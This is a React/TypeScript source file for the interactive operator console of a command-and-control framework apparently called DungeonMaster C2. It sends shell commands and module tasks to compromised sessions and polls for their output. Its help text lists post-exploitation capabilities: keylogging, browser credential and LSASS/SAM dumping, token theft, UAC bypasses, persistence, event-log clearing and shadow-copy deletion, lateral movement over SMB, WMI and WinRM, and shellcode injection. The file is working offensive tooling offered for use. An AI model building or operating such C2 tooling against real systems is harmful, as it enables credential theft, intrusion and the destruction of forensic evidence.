import { useEffect, useRef, useState } from 'react'
import { Terminal } from 'xterm'
import { FitAddon } from '@xterm/addon-fit'
import 'xterm/css/xterm.css'
import { api } from '../../api/client'
import { type RichContent, detectOutputType } from './RichOutput'

interface Props {
  sessionId:    string
  campaignId?:  string
  onRichOutput?: (content: RichContent) => void
}

const HELP_LINES = [
  '\x1b[36mModule commands  (!type method [key=value ...])\x1b[0m',
  '',
  '\x1b[33menum\x1b[0m     processes | users | groups | localadmins | shares | sessions | routes | netdiscovery | tasks | domain | services',
  '\x1b[33mcollect\x1b[0m  clipboard | file-search path="C:\\\\..." ext=".docx" | screen-record [count=1] | keylog-start | keylog-dump | keylog-stop | wifi | vault | browser-creds | browser-history | dpapi',
  '\x1b[33mpriv\x1b[0m     sam-dump | token-steal [pid=N] | token-make | uac-fodhelper cmd="..." | uac-eventvwr cmd="..." | pipe-impersonate',
  '\x1b[33mpersist\x1b[0m  reg key="..." val="..." | task name="..." cmd="..." | svc name="..." | startup | com | wmi | reg-rm key="..." | svc-rm name="..."',
  '\x1b[33mantifor\x1b[0m  timestomp path="..." modified="2020-01-01 00:00:00" | eventlog-clear log="Security" | eventlog-del log="..." id=N | indicator-rm path="..." | shadow-delete',
  '\x1b[33mlateral\x1b[0m  smb-psexec host="..." cmd="..." | wmi host="..." cmd="..." | winrm host="..." cmd="..." | dcom host="..." cmd="..."',
  '\x1b[33mcred\x1b[0m     lsass',
  '\x1b[33minject\x1b[0m   classic pid=N shellcode="<b64>" | apc pid=N shellcode="<b64>" | hollow exe="..." shellcode="<b64>" | hijack pid=N shellcode="<b64>" | stomp pid=N dll="..." shellcode="<b64>"',
  '',
  'Shell:   type any command without ! prefix (runs via cmd /C)',
]

function parseModuleArgs(tokens: string[]): Record<string, unknown> {
  const args: Record<string, unknown> = {}
  for (const tok of tokens) {
    const eq = tok.indexOf('=')
    if (eq === -1) continue
    const key = tok.slice(0, eq)
    const val = tok.slice(eq + 1)
    const num = Number(val)
    args[key] = val !== '' && !isNaN(num) ? num : val
  }
  return args
}

function tokenize(line: string): string[] {
  const tokens: string[] = []
  let cur = ''
  let inQ = false
  let qch = ''
  for (const ch of line) {
    if (inQ) {
      if (ch === qch) inQ = false
      else cur += ch
    } else if (ch === '"' || ch === "'") {
      inQ = true; qch = ch
    } else if (ch === ' ' || ch === '\t') {
      if (cur) { tokens.push(cur); cur = '' }
    } else {
      cur += ch
    }
  }
  if (cur) tokens.push(cur)
  return tokens
}

export function SessionConsole({ sessionId, campaignId: _campaignId, onRichOutput }: Props) {
  const containerRef = useRef<HTMLDivElement>(null)
  const termRef      = useRef<HTMLDivElement>(null)
  const term         = useRef<Terminal>()
  const fitAddon     = useRef<FitAddon>()
  const [input, setInput] = useState('')
  const [busy, setBusy]   = useState(false)

  useEffect(() => {
    if (!termRef.current || !containerRef.current) return

    const t = new Terminal({
      theme: {
        background:   '#060a10',
        foreground:   '#c4ddf0',
        cursor:       '#00d4b0',
        cursorAccent: '#060a10',
        selectionBackground: 'rgba(0,212,176,0.2)',
        black:   '#060a10',
        red:     '#ff3a4c',
        green:   '#00d4b0',
        yellow:  '#ffb730',
        blue:    '#4090ff',
        magenta: '#9966ff',
        cyan:    '#00b8a0',
        white:   '#c4ddf0',
        brightBlack:   '#2c4258',
        brightRed:     '#ff6070',
        brightGreen:   '#00e5c0',
        brightYellow:  '#ffd060',
        brightBlue:    '#60a8ff',
        brightMagenta: '#b880ff',
        brightCyan:    '#40d0b8',
        brightWhite:   '#e8f4ff',
      },
      fontFamily: '"Cascadia Code", "JetBrains Mono", "Fira Code", Consolas, monospace',
      fontSize:   13,
      lineHeight: 1.4,
      cursorBlink:  true,
      convertEol:   true,
      scrollback:   5000,
    })

    const fa = new FitAddon()
    t.loadAddon(fa)
    t.open(termRef.current)
    fa.fit()

    term.current     = t
    fitAddon.current = fa

    t.writeln('\x1b[36mDungeonMaster C2 — Interactive Shell\x1b[0m')
    t.writeln(`\x1b[90mSession: ${sessionId}\x1b[0m`)
    t.writeln('\x1b[90mShell commands run directly. Prefix with ! for module tasks (!help for list).\x1b[0m')
    t.writeln('')

    const obs = new ResizeObserver(() => requestAnimationFrame(() => fa.fit()))
    obs.observe(containerRef.current)

    return () => {
      obs.disconnect()
      t.dispose()
    }
  }, [sessionId])

  async function sendCommand(cmd: string) {
    if (!cmd.trim() || busy) return
    setBusy(true)

    if (cmd.startsWith('!')) {
      const line = cmd.slice(1).trim()

      if (line === 'help' || line === '') {
        HELP_LINES.forEach(l => term.current?.writeln(l))
        setBusy(false)
        return
      }

      const tokens = tokenize(line)
      const type   = tokens[0]
      const method = tokens[1]

      if (!method) {
        term.current?.writeln('\x1b[31musage: !<type> <method> [key=value ...]\x1b[0m')
        setBusy(false)
        return
      }

      const args = { method, ...parseModuleArgs(tokens.slice(2)) }
      term.current?.writeln(`\x1b[35m[${type}/${method}]\x1b[0m`)

      try {
        const { data } = await api.post('/api/v1/tasks', {
          session_id: sessionId,
          type,
          args: btoa(JSON.stringify(args)),
        })
        await pollTaskOutput(data.task_id, `${type}/${method}`)
      } catch (err: unknown) {
        term.current?.writeln(`\x1b[31mError: ${(err as Error).message}\x1b[0m`)
      } finally {
        setBusy(false)
      }
      return
    }

    term.current?.writeln(`\x1b[33m$ ${cmd}\x1b[0m`)
    try {
      const { data } = await api.post('/api/v1/tasks', {
        session_id: sessionId,
        type:       'shell',
        args:       btoa(JSON.stringify({ cmd })),
      })
      await pollTaskOutput(data.task_id)
    } catch (err: unknown) {
      term.current?.writeln(`\x1b[31mError: ${(err as Error).message}\x1b[0m`)
    } finally {
      setBusy(false)
    }
  }

  async function pollTaskOutput(taskId: string, label = 'task') {
    for (let attempt = 0; attempt < 60; attempt++) {
      await sleep(2000)
      try {
        const { data } = await api.get(`/api/v1/tasks/${taskId}`)
        if (data.status === 'complete' || data.status === 'failed') {
          if (data.status === 'failed') {
            term.current?.writeln('\x1b[31m[failed]\x1b[0m')
            return
          }
          if (!data.output) {
            term.current?.writeln('\x1b[90m(no output)\x1b[0m')
            return
          }
          const bytes = Uint8Array.from(atob(data.output), c => c.charCodeAt(0))
          if (onRichOutput) {
            const rich = detectOutputType(bytes, label)
            if (rich) {
              term.current?.writeln('\x1b[90m[→ output panel]\x1b[0m')
              onRichOutput(rich)
              return
            }
          }
          const text = new TextDecoder().decode(bytes)
          term.current?.writeln(`\x1b[0m${text}\x1b[0m`)
          return
        }
      } catch {
        // continue polling
      }
    }
    term.current?.writeln('\x1b[31mTimeout waiting for task output\x1b[0m')
  }

  function handleKeyDown(e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === 'Enter') {
      sendCommand(input)
      setInput('')
    }
  }

  return (
    <div
      className="flex flex-col h-full overflow-hidden"
      style={{ background: '#060a10', border: '1px solid var(--dm-border)' }}
    >
      <div ref={containerRef} className="flex-1 min-h-0 relative">
        <div ref={termRef} className="absolute inset-0 p-2" />
      </div>

      <div
        className="flex items-center gap-2 flex-shrink-0"
        style={{
          borderTop: '1px solid var(--dm-border)',
          padding: '0.4rem 0.75rem',
          background: '#060a10',
        }}
      >
        <span style={{ color: 'var(--dm-accent)', userSelect: 'none', fontSize: '0.82rem' }}>$</span>
        <input
          type="text"
          value={input}
          onChange={e => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          disabled={busy}
          placeholder={busy ? 'waiting for output...' : 'command or !type method [key=val ...]'}
          autoComplete="off"
          spellCheck={false}
          style={{
            flex: 1,
            background: 'transparent',
            border: 'none',
            outline: 'none',
            color: 'var(--dm-text-hi)',
            fontFamily: 'inherit',
            fontSize: '0.82rem',
          }}
        />
        {busy && (
          <span style={{ color: 'var(--dm-amber)', fontSize: '0.65rem', letterSpacing: '0.12em', animation: 'dm-pulse 1.2s ease-in-out infinite' }}>
            RUNNING
          </span>
        )}
      </div>
    </div>
  )
}

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms))
}
